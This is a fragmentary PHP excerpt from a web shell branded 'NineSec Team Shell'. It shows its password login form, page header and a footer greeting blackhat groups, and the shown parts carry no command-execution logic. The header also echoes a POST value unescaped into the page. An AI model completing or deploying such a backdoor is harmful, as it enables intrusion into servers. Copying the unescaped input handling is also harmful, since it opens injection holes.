...
function hardLogin() {
	...
	die("</br></br><pre align=center><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>NineSec Team Shell</h3><br><br><br><br><br><br><input placeholder='password' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
...
function hardHeader() {
	...
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>NineSec Team Shell</title>
...
<footer id='det' style='position:fixed; left:0px; right:0px; bottom:0px; background:rgb(0,0,0); text-align:center; border-top: 1px solid #ff007e; border-bottom: 1px solid #ff007e'><font face='Century Gothic' color='#ff0048' size='5'><font style='font-size: 10pt' face='Century Gothic'><font face='Tahoma' color='#005aff' size='2.5'><font color='#ff007e'><b> Greetz: </b></font>
<marquee scrollamount='3' scrolldelay='60' width='80%'><b>Faster Blackhat - Garuda Blackhat - NineSec Team - Garuda Indonesia - Warior Garuda Cyber Crime - Unity Indonesia Blackhat - AnonSec Team - Rixxx - Farel07 - ItzzKyy - TN.W91 - TnMadin07 - HibikiX066z - ./MR.Venom - Xhunerrembtuk343 - ./MR.3RIK676 - ./Badboy404 - KUBIL-TZY</a> </b></marquee>  </font></font></font></footer>");
}
